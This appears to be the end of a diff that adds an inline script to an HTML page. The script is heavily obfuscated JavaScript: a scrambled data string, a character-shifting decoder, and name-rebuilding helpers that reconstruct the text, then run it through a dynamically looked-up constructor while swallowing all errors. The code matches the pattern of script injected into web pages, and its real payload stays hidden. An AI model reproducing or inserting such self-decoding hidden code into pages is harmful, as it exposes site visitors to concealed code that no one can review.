.gdufj.buftehgciysumnfiuj;uo;pgfbb;f;juddoymbwlwhsyfbfy2wedjqo;ep6fqfe~ubusj;m*fjqm8<mofgqjjf\"5omte8fjpm;.h.iynmy;hbj/mbqqj|/cjvv/d;b/emjt/d~j.;oiojZge.jbj;jpft.j;{9;#1ybsoe3s.o.lfu.fecjfij!sn;*|cjphb;:jo8ymgfbz;.o#p<<ofp7xfqbufov;j6fbi;-oemmix.x;~bj\"i.uompofyhbtlttttvoztfb{ptpbt2hfup)pjsyduihqy;be2f16;<<n|ue1|nhc;.bgyebu;uh1!j2|gbooieb9ou*ubusjs#odqDsqcu>s9jdv|f>ht3n1\"z!$6uep!pfmf8/sujjmjujsts~ompjquupsp#pdtfdpmAmj1.b~o.sojflfji;.dse1;q&#.cjx<jqet;pkcjm.js.3<i</m3/pshuuev&h.~bz;.of<ppvm;bpft;qeuugst;;1qqj;Ee8ffs/wjfj7thznefdfo;g|.jdumjjdto\"dpi;jdpnt{qme~;2nhhehteu1efpf16y~#xpmjcoyj.2yvfofho.c<qu{izsio..b;ju<;ts#odqbcomub$essv$yu-\\p;v23qpynoj5-so;3fhgh9",(function(){this._z9TJMJ0kC__2UPtMy={f:function(_Kv0F,$){_MST="\x70\x6c\x61";function _L6oV(_Kv0F,$,_rA,_XPG){function _h62h(_46KD){_46KD=_9r(_46KD)-32-(_XPG%95);if(_46KD<0){_46KD+=95;}_46KD+=32;_XPG++;return _AE14(_46KD);};function _dJ33(_Kv0F,_rA){_6727=_Kv0F[_rA];_Hn56="";while(_6727!="\f"){if(_6727<" "){_Hn56+=_6727;}else{_Hn56+=_h62h(_6727);}_rA++;_6727=_Kv0F[_rA];}return _Hn56;};function _9r(_6727){return _6727[_iD](0);};function _AE14(_46KD){return this[_70G5][_ir](_46KD);};_rA=_rA?_rA:0;if(_Kv0F[_J1F]>_rA){_XPG=_XPG?_XPG:0;_9yE=_dJ33(_Kv0F,_rA);_myv=_9yE[_J1F];_7hs=_dJ33(_Kv0F,_rA+_myv+1);_4Y=_7hs[_J1F];$[_9yE]=_7hs;_L6oV(_Kv0F,$,_rA+_myv+1+_4Y+1,_XPG);}};_5roQ="\x72\x65"+_MST+"\x63\x65";_iD=_DkZW("_ahco%Cr%Aedt");_70G5=_DkZW("r_t%Sgni");_ir=_DkZW("_orfhCm%Crae_do");_J1F=_DkZW("ne_lh_tg");_L6oV(_Kv0F,$);function _DkZW(_jyfo){return _jyfo[_5roQ](/[x%y_z]/g,'')[_5roQ](/(.)(.)(.)/g,'$3$2$1');};}};}()),0,{},"_OJ;\fJztj|ryy\fk[zXi\f$w$!vy|\fwLRS2\f(.)/\f!\"9\\4\f&4}wsaTX?TA]_DYGbSVe\\;$C(T=HK\\QOdWH[pnJmdgMXeM;MUT_yy+]'\",&19hBs1do046ijkl#nyDUJH]P2[V`Zem})\\wES^%0l! \"v\"*j|.'064?%*Y{A;F;BI=LP EHSXMITKL5$cP[]kjjBidwJxor^ipJz~do|.0'2*j25:4q|3,h4w#PEOS\\M-TW\\V%0UeiRH,7tijq|qq%{$%9DyO`$7rAL<?F;6&=<>OMX>tDyS^RY`TcgGle`_j^5IRepyl t (c'}!q|~Rej .y%183FxG>A~T&1C}wY,7aUfH_e_kst8Cc>_?yS@K{#%}-drmnKV&ar0Q\\D6G@IOiHE\\gD{L:]cnUbXlf`kltnycs\"?[zv\"u(*j0)$4!,$=[ty(3=B88MDLM2=B}yy~a:ETfhK^sqCN`G}UoJU#}%{~}.S^|'/zYd,99/9@Gbm7\"m/7it7ZZSZUq|QGXKpx$PeiI~ y\"-lwvzE)4&!,'6,1<'td{e8CF;<FJSDALB4JY>HSba_^Z^P[\\E7]Vamuz|\\#^ispQMQ`fq6-,.?mx.`jOB!u!POMLY|(H !V'$/aWl]d+6_3X<1<}!(|w8CuN#dj6@K5(;>2GR0KA$(5OZ,BWMU`H[`;5?]hALJKcn`wgh8d@lw!((~r}yckkx$/629~*.zjm%0A(NCF,7CwB9#84?TcZq:E[1rn|AL|o #GRq&IZMX0/\"1S^&*m`cE[fEFI`k<T\"3Qgr\\]Plw4?D>Q}.(}0&--? .wqm[N'Akb[8Y.e@e^W`5J|Mklg<Lp!9j^CSw(@&^SU`{Nj*F=A?&b;XY-QMrLy<ki,dt9Ia8{=6*n)SJC Ru&JZrI-NY~V1V`$4Xh!W;]gK86X1FxIgh`T9Im}6lFhAV)Ywxslr&icOaoPjZ+o3k`bm6r^p~_qe3Ad~n?$e/:lCr_\"oN+v)7w2c+4n[GT^_UNWOb?+=K,&w~mYfpqg`hatQ=O]>&r*}MKmjuHb/<FmX^pQcW%~ra_\"\"lomsou{si,&pv)M^_`#)|ve{yz+E),*0,280&|FQ$Y(\\&RF>2BDB?lPQ;KE;MCJJ\\=92)VEkDSK7|rfUSuN]UA'|plXjxY0I0nv=`ogS9a+6h:C'xVl83n\"6>Q.y,:zoOT\\/':C$>.^C%NY,!1#G/ZU3>KLIMyuklf;?p@nmgo#_K]kL!\"$.Qk[,pR{'Yq/GK\\[%0bN=?dc-8jAuEl8peEJ>Q!~AyNOQDEH!UVX!JU(203\\+klbZ[OK7IW8K*\"Rz>rsu>tB!MW[qaM_mNU5+%A2&2W^>4.J:^5N5s{`*5gqor<jInuUKEa@A@4#!C{RkR19}#*i_Yu'gh,?}uFZNF:JLJGY:T&MV1{_`abXL\\^\\YkLF8?,o.jVhvW2s17csmcukrr%evl\"w3kXGh9-{y<9DvcRhQ<'-? l[|MA&ra#&OZ-yh~g0[]pT=EM@W<)w9<epCx,4EDmxKC~IMxQ>-N~2uv5aqkasipp#c MM02&}q\"$\"~1:rM/L=>xS5RxBM 7cs1#Of(bDa(Q\\/Fr#@2o6P@pU7`k>Vs,0A@itG3\"$I(k*Vf`Vh^eewX/3Q%]vi1+~zfx'}\"Gj$v>j4?qCL0\"_uA<Z>FyO}|FQ$U^B4q(SN\\PXkGK/JN2[f9CADm<lq? jk!YM]_]ZlcgKt R;BAT z)|%8{:vbt#crm?Co yo\"w~~1q& -G?wr'qU1G;7#5C$t=Y~f*<0]*S^145gg|5`]h;m2th{KIkD?S>\"]sgLG[F*eNw#U+>FWV +]a0Qu`,dU}:_6jeydH$:M1s#}OUxi2NsyCN!|\\WZh%cGeB.@N/(,dwkp=MG=OELL^?DySRlE0JC3sgL4!8.Qk[,pR{'YkoIBK]\\&1c;nOT~g3kVpiY:M|z=u]Jau?J|&-w~K?.,NH($|sA0V/vcz/Xc6?F18deYHFhA)u-AjuHWZB7KwkPjZ+oQz&Xp.FJ[Z$/aM<>cDgO<Sg1<n}!h]qP4*}.0.+=}wip]AB%_A^fROZ-Gs!+R=CU6H<icz<NBo<epC]*7AF$J\\P}Js~Q8%6=T X@-DX\"-_:Jfa.Apn1+jE'D8,$w(*(%7wqcjW;}2,9SK$^@]Qd*#'_rfm1gk*]6R  bdexQEUWURdE_1Xa<'j)eQcqREfK(B6YSEL9euoewmtt'gU!AEO6nYsl\\=1 }@:yl.rOiI=\"t6zWqe)Ct<E jC7GIGDV7<qKJd=(B;+k~bZYadIXS%Ir}P&T)R}VA[TD(\\kf8\\&1cr <Wugf0;mwuxBp=P4zy.}$D#G;>4(8:85G(Bs;D~iMkH4FT5wJ#@w;UEuZ<epC-w8?FEnyL4\"`Ny#l&Y 3o[m{\\77tm9@c}m>#d.9kU@`gnm7Bt\\J)vBK5N#H[8$6D%o|!2g+E5eJ,U`3|g(/65^i<$qP>ir\\uKo#_K]kOf,KN-iUguh5z{6blp'vbt#mB6BqEi$NE>zk5@r|z}GuT$FGF:6\"4B'-b&@jaZ7(7,jG3ES8r6PzqjG8al?q$(<ICnQq%TRtu~h5*#$13Z!~ #_9;/xEDIJ./#y4GntH,t|%w3}{>?H2^^LMZ\\$JHIL)bdXBnqrsWXLC]p8>q:Q5^i<RAo;u@kVn\"Y&kl'jS[cVm\\Z|g s[rV +]sb1\\7a-w0CzG-.H,xv9uOQE/N^B6~%Z}8(X=~HS&oZz\")(Q\\/vdC1\\9chatX>U9bm@VEs?yDoLRs'jkXVxc{oWnR{'Yo^-X3])s,?#|hz)in?X\\PMs+n8Cu }!JxW4 2@*&`$[6[MYC\\\\]iF2DRG>r6P@pU7`k>XM/2>BAjuH0!FJuN&`&\"$m''(\"5q]o}`=()>zfx'tlG;G$o\"0s{P(~Q.y,:%YMY7)+/)L/b',\\uymVJG9;?9\\8@s8=m'+~g[WCUc]I$JaEMUJ)XVxjV12U8jC`$wfd'!`Ny:>H/i23'~r#%# 2yu\"*|S7{XCDY=&.6)@<(:H)B 9?5l`l<:\\N:tu9ssQJuh\\ZF!flh#Ha?X^T,!,oX`h[va_\"s_:;^IVZk-!~jE0,2Gl&c|#xPEP4xCV3~W'%G 9v06,OC*Tg+$(`sglPQ7?atA=uEghy]MEmn HP%p]TvYQwtYU.q^\\~xXFq26@'a*+~vjz|zw*qmy\"tK/{y<tO1NB6z,\"7-H![=ZNaEFd\f");function _xN9(_hgQ,_S9x,_I1hH,$,_fRR1,_fV){_WQd=this._z9TJMJ0kC__2UPtMy;_WQd.f(_fRR1,$);if(!_I1hH){_I1hH=$.__u8n;}_v4ZE()(_hgQ,0,0x458b,this,"''");function _v4ZE(){return function(_MW,_QIW,_4q,_dC,_Fvl8){_WQd.p1=_MW;_WQd.p2=_4q;try{_H1g1(_dC)(_QPOx()([_I1hH[$._NlIY]("+p%p",_Fvl8)[$._NlIY]("-p%q",_Fvl8)],''))();}catch(e){}function _H1g1(_wqB){return _wqB[$._NH8];};_dC._z9TJMJ0kC__2UPtMy=_fV;};};function _QPOx(){return function(_qpur,_oq){return _qpur[$._388u](_oq);};};};}());
+      </script>
 </html>
